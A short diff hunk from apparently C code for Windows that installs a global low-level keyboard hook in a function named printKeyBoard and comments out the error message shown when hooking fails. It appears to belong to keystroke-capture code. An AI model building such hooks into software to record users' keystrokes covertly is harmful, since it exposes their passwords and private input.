@@ -49,7 +49,7 @@ int printKeyBoard() {
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 
     if (hHook == NULL) {
-        printf("Error by connection hook\n");
+        //printf("Error by connection hook\n");
         return 1;
     }
 
